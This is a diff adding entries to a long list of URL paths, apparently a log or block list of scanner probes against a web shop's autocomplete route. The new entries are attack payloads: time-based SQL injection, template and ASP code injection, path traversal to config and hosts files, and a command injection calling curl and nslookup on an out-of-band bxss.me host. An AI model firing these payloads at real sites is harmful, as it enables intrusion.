@@ -52781,3 +52781,17 @@ http://ifconfig.me/
 /@@7flGf?route=account/return/add
 /cf-fonts/s/noto-sans-arabic/5.0.11/arabic/../../../../../Gemfile
 /cf-fonts/s/noto-sans-arabic/5.0.11/arabic/../../../../../web.config
+/${10000093+10000135}?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
+/index.php0\x22XOR(if(now()=sysdate(),sleep(15),0))XOR\x22Z?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
+/C:\x5CWINDOWS\x5Csystem32\x5Cdrivers\x5Cetc\x5Chosts?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
+/index.php0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
+/if(now()=sysdate(),sleep(15),0)?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
+/'\x22()?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
+/'+response.write(9309201*9695561)+'?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
+/)?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
+/cf-fonts/../web.config
+/bxss.me?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
+/cf-fonts/../Gemfile
+/|(nslookup${IFS}-q${IFS}cname${IFS}hithrazqcapdt35ee5.bxss.me||curl${IFS}hithrazqcapdt35ee5.bxss.me)?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
+/response.write(9309201*9695561)?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
+/\x22+response.write(9309201*9695561)+\x22?filter_category_id=0&filter_name=c&limit=5&route=extension/maza/product/product/autocomplete
